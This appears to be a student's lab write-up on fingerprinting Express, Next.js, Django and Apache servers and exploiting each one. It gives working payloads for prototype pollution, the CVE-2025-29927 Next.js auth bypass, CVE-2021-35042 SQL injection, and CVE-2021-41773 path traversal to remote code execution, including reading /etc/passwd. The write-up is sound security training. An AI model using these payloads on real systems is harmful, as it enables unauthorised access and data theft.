# Modern Web Stacks

## What This Room Is About

Every website leaks information about its technology stack. By identifying 
the stack and version early, you can find relevant CVEs and focus on likely 
attack paths instead of relying only on automated scanners.

The workflow applied to every target:

1. Fingerprint the stack
2. Identify the version
3. Find matching CVEs
4. Understand the vulnerability
5. Execute the exploit

---

## Tools Used

- `curl` — header inspection and response body retrieval
- `nikto` — automated stack fingerprinting across multiple ports

---

## What I Learned

### MERN Stack (MongoDB, Express, React, Node.js)

Default ports: Express on `3000` or `5000`, MongoDB on `27017`

**Fingerprinting:**

```bash
curl -I http://TARGET_IP:3000
```

Primary signal: `X-Powered-By: Express`

If absent, fall back to:
- Cookie name: `connect.sid` (from `express-session` middleware)
- Unhandled route response:

```bash
curl http://TARGET_IP:3000/nonexistent
# Returns: Cannot GET /nonexistent
```

This plain-text response is unique to Express — Django returns styled HTML, 
Apache returns a formatted 403/404.

**Vulnerability: Prototype Pollution**

The app exposed an `/api/user/update` endpoint that merged user-supplied JSON 
into a user object with no key filtering. Sending `__proto__` as a key 
causes the merge function to write into `Object.prototype` instead of the 
user object.

Exploit payload:

```bash
curl -b cookies.txt -X POST http://TARGET_IP:3000/api/user/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'
```

After this, `currentUser.isAdmin` resolves `true` via the prototype chain, 
bypassing the admin check.

**Key lesson:** Never trust user-supplied JSON keys. 
`merge(user, req.body)` without key validation = prototype pollution.

---

### Next.js (React/Node.js)

Default port: `3001`

**Fingerprinting:**

```bash
curl -I http://TARGET_IP:3001
```

Signals: `X-Powered-By: Next.js`, `Vary: RSC`, `x-nextjs-cache`, 
`x-nextjs-prerender`

These confirm: Next.js + App Router + React Server Components (RSC)

**CVE-2025-29927 — Middleware Authentication Bypass (CVSS 9.1)**

Next.js uses `x-middleware-subrequest` internally to prevent infinite loops 
when middleware forwards requests. The flaw: Next.js never validated whether 
this header came from an internal process or an external client.

Sending it yourself skips middleware entirely — authentication check never runs:

```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://TARGET_IP:3001/dashboard
```

No credentials, no session token. One header bypasses all auth.

**Note:** If the project uses a `src/` directory structure, the header value 
changes to `src/middleware` instead of `middleware`.

---

### Django (Python)

Default port: `8000`

**Fingerprinting:**

Primary signal: `csrfmiddlewaretoken` hidden field in every POST form — 
unique to Django, not present in Express, Rails, or Next.js.

Secondary signal: combination of `X-Frame-Options: DENY` + 
`X-Content-Type-Options: nosniff` + `Referrer-Policy: same-origin` 
appearing together = Django's `SecurityMiddleware`.

**CVE-2021-35042 — SQL Injection via `order_by()` (CVSS 9.8)**

The `/products/` view concatenated the `?order=` parameter directly into 
an `ORDER BY` clause without sanitization. Used `updatexml()` to trigger 
MySQL errors that leak data in the response body.

Extract database version:

```bash
curl -s "http://TARGET_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" \
  | grep -o '~[0-9][^&]*'
```

Extract database name:

```bash
curl -s "http://TARGET_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" \
  | grep -o '~[0-9a-zA-Z_][^&]*'
```

`0x7e` = hex for `~`, used as a delimiter to isolate extracted values in 
the error message.

---

### LAMP Stack (Linux, Apache, MySQL, PHP)

Default port: `8080`

**Fingerprinting:**

```bash
curl -I http://TARGET_IP:8080
curl -v http://TARGET_IP:8080/nonexistent 2>&1
```

Signal: `Server: Apache/2.4.49` — this exact version maps directly to 
CVE-2021-41773. Also check `/cgi-bin/`: a 403 means the directory exists 
and `mod_cgi` is configured (required for RCE).

**CVE-2021-41773 — Path Traversal + RCE (Critical)**

Apache 2.4.49 broke its path traversal filter. The filter ran before full 
URL decoding, so `.%2e/` passed the filter but resolved as `../` on the 
filesystem.

Combined with `mod_cgi`, traversing to `/bin/sh` executes it as a CGI 
script with POST body passed to stdin.

**Important:** `--path-as-is` is required. Without it, curl normalises the 
URL before sending and the server never sees the encoded dots.

Confirm RCE:

```bash
curl -s --path-as-is "http://TARGET_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; id'
```

Read system files:

```bash
curl -s --path-as-is "http://TARGET_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; cat /etc/passwd'
```

---

### Automation with Nikto

```bash
nikto -h http://TARGET_IP:PORT
```

Nikto confirmed the stack on all four ports in under a minute:

| Port | Stack | Key Signal |
|------|-------|------------|
| 3000 | MERN/Express | `x-powered-by: Express`, `connect.sid` cookie |
| 3001 | Next.js | `x-powered-by: Next.js`, `x-nextjs-*` headers |
| 8000 | Django | `WSGIServer/0.2 CPython`, SecurityMiddleware headers |
| 8080 | Apache | `Server: Apache/2.4.49` → direct CVE-2021-41773 hit |

Nikto surfaces stack signals fast but has no templates for 
application-level flaws. Manual techniques take over from there.

---

## Key Commands

```bash
# Header fingerprinting
curl -I http://TARGET_IP:PORT

# Trigger unhandled route (Express fingerprint)
curl http://TARGET_IP:3000/nonexistent

# Save and reuse session cookies
curl -c cookies.txt http://TARGET_IP:3000/
curl -b cookies.txt http://TARGET_IP:3000/api/admin/flag

# Next.js middleware bypass
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
  http://TARGET_IP:3001/dashboard

# Apache path traversal RCE
curl -s --path-as-is "http://TARGET_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
  --data 'echo Content-Type: text/plain; echo; id'

# Automated scanning
nikto -h http://TARGET_IP:PORT
```

---
